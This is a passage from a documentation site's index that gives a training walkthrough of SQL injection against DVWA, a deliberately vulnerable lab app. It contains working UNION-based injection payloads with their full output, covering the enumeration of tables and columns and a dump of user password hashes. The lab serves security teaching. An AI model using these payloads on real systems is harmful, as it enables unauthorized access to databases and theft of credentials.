<code>admin:password</code>.</p>"},{"location":"vulnerabilities/dvwa/#vulnerability-sql-injection","title":"Vulnerability: SQL Injection","text":"<p>Enter <code>1</code> in the filed and press ENTER. A red error text pop-up should appear with the following text:</p> <pre><code>ID: 1\nFirst name: admin\nSurname: admin\n</code></pre> <p>This error already indicates that the application is vulnerable: instead of displaying User Not Found or a similar message, it shows the first and last name of the user with the ID of 1.</p> <p>Let's see if we can find more users. Enter the following into the User ID field and press ENTER:</p> <pre><code>sparklekitten' or '1'='1\n</code></pre> <p>By entering this input, you should get the following output:</p> <pre><code>ID: sparklekitten' or '1'='1\nFirst name: admin\nSurname: admin\nID: sparklekitten' or '1'='1\nFirst name: Gordon\nSurname: Brown\nID: sparklekitten' or '1'='1\nFirst name: Hack\nSurname: Me\nID: sparklekitten' or '1'='1\nFirst name: Pablo\nSurname: Picasso\nID: sparklekitten' or '1'='1\nFirst name: Bob\nSurname: Smith\n</code></pre> <p>Let's find all the names of the tables in the database.</p> <pre><code>sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\n</code></pre> <p>You should get a long list of names, most of which are standard tables created for running the SQL database. In the following output, only the two at the top are important for our purposes: <code>guestbook</code> and <code>users</code>.</p> <pre><code>ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: ALL_PLUGINS\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: APPLICABLE_ROLES\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: CHARACTER_SETS\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: CHECK_CONSTRAINTS\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: COLLATIONS\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: COLLATION_CHARACTER_SET_APPLICABILITY\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: COLUMNS\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: COLUMN_PRIVILEGES\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: ENABLED_ROLES\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: ENGINES\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: EVENTS\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: FILES\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: GLOBAL_STATUS\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: GLOBAL_VARIABLES\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: KEYWORDS\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: KEY_CACHES\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: KEY_COLUMN_USAGE\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: OPTIMIZER_TRACE\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: PARAMETERS\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: PARTITIONS\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: PLUGINS\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: PROCESSLIST\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: PROFILING\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: REFERENTIAL_CONSTRAINTS\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: ROUTINES\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: SCHEMATA\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: SCHEMA_PRIVILEGES\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: SESSION_STATUS\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: SESSION_VARIABLES\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: STATISTICS\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: SQL_FUNCTIONS\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: SYSTEM_VARIABLES\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: TABLES\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: TABLESPACES\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: TABLE_CONSTRAINTS\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: TABLE_PRIVILEGES\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: TRIGGERS\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: USER_PRIVILEGES\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: VIEWS\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: CLIENT_STATISTICS\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: INDEX_STATISTICS\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: INNODB_FT_CONFIG\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: GEOMETRY_COLUMNS\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: INNODB_SYS_TABLESTATS\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: SPATIAL_REF_SYS\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: USER_STATISTICS\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: INNODB_TRX\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: INNODB_CMP_PER_INDEX\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: INNODB_METRICS\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: INNODB_FT_DELETED\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: INNODB_CMP\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: THREAD_POOL_WAITS\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: INNODB_CMP_RESET\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: THREAD_POOL_QUEUES\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: TABLE_STATISTICS\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: INNODB_SYS_FIELDS\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: INNODB_BUFFER_PAGE_LRU\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: INNODB_LOCKS\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: INNODB_FT_INDEX_TABLE\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: INNODB_CMPMEM\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: THREAD_POOL_GROUPS\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: INNODB_CMP_PER_INDEX_RESET\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: INNODB_SYS_FOREIGN_COLS\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: INNODB_FT_INDEX_CACHE\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: INNODB_BUFFER_POOL_STATS\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: INNODB_FT_BEING_DELETED\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: INNODB_SYS_FOREIGN\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: INNODB_CMPMEM_RESET\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: INNODB_FT_DEFAULT_STOPWORD\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: INNODB_SYS_TABLES\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: INNODB_SYS_COLUMNS\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: INNODB_SYS_TABLESPACES\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: INNODB_SYS_INDEXES\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: INNODB_BUFFER_PAGE\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: INNODB_SYS_VIRTUAL\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: user_variables\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: INNODB_TABLESPACES_ENCRYPTION\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: INNODB_LOCK_WAITS\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: THREAD_POOL_STATS\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: guestbook\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: users\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: access_log\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: security_log\nID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #\nFirst name: \nSurname: session_account_connect_attrs\n</code></pre> <p>Now that we know the table name for users, we can query it for more information:</p> <pre><code>sparklekitten' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #\n</code></pre> <p>This line asks for all column names in the <code>users</code> table. The <code>concat</code> command asks for the table name and column name from any table named <code>users</code>. The <code>0x0a</code> syntax represents a newline so the table name and column name are printed separately, making them easier to read. The output should contain several lines showing the names of the columns in the table:</p> <pre><code>ID: sparklekitten' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #\nFirst name: \nSurname: users\nuser_id\nID: sparklekitten' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #\nFirst name: \nSurname: users\nfirst_name\nID: sparklekitten' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #\nFirst name: \nSurname: users\nlast_name\nID: sparklekitten' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #\nFirst name: \nSurname: users\nuser\nID: sparklekitten' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #\nFirst name: \nSurname: users\npassword\nID: sparklekitten' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #\nFirst name: \nSurname: users\navatar\nID: sparklekitten' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #\nFirst name: \nSurname: users\nlast_login\nID: sparklekitten' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #\nFirst name: \nSurname: users\nfailed_login\nID: sparklekitten' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #\nFirst name: \nSurname: users\nrole\nID: sparklekitten' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #\nFirst name: \nSurname: users\naccount_enabled\n</code></pre> <pre><code>erDiagram\n    users {\n        string user_id\n        string first_name\n        string last_name\n        string user\n        string password\n        string avatar\n        string last_login\n        string failed_login\n        string role\n        string account_enabled\n    }</code></pre> <p>Use the following query to see what the database stores in the password field:</p> <pre><code>%' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #\n</code></pre> <pre><code>ID: %' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #\nFirst name: \nSurname: admin\nadmin\nadmin\n5f4dcc3b5aa765d61d8327deb882cf99\nID: %' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #\nFirst name: \nSurname: Gordon\nBrown\ngordonb\ne99a18c428cb38d5f260853678922e03\nID: %' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #\nFirst name: \nSurname: Hack\nMe\n1337\n8d3533d75ae2c3966d7e0d4fcc69216b\nID: %' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #\nFirst name: \nSurname: Pablo\nPicasso\npablo\n0d107d09f5bbe40cade3de5c71e9e9b7\nID: %' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #\nFirst name: \nSurname: Bob\nSmith\nsmithy\n5f4dcc3b5aa765d61d8327deb882cf99\n</code></pre> <ul> <li>https://bobby-tables.com/</li> </ul>"},{"location":"vulnerabilities/dvwa/#cleanup","title":"Cleanup","text":"<pre><code>k delete -f code/dvwa/dvwa.kubernetes.yaml\n</code></pre>"},{"location":"vulnerabilities/dvwa/#build-a-custom-docker-container-image","title":"Build a Custom Docker Container Image","text":"<pre><code>git clone git@github.com:digininja/DVWA.git\ncd DVWA\n</code></pre> <pre><code>-FROM docker.io/library/php:8-apache\n+FROM docker.io/library/php:8.3-apache\n</code></pre> <pre><code>docker buildx build -t ghcr.io/digininja/dvwa:8.3-apache .\n</code></pre> <pre><code>docker image save -o /tmp/dvwa.tar ghcr.io/digininja/dvwa:8.3-apache\nsudo ctr -n k8s.io image import /tmp/dvwa.tar &amp;&amp; rm /tmp/dvwa.tar\n</code></pre>"},{"location":"vulnerabilities/dvwa/#further-reading","title":"Further Reading","text":"<ul> <li>https://github.com/digininja/DVWA</li> <li>https://medium.com/@sonalipriyankasamantaray/penetration-testing-with-dvwa-damn-vulnerable-web-application-e61f5ac9cb24</li> <li>https://www.youtube.com/watch?v=WkyDxNJkgQ4</li> <li>https://owasp.org/www-project-vulnerable-web-applications-directory/</li> <li>https://hub.docker.com/r/vulnerables/web-dvwa</li> </ul>"}]}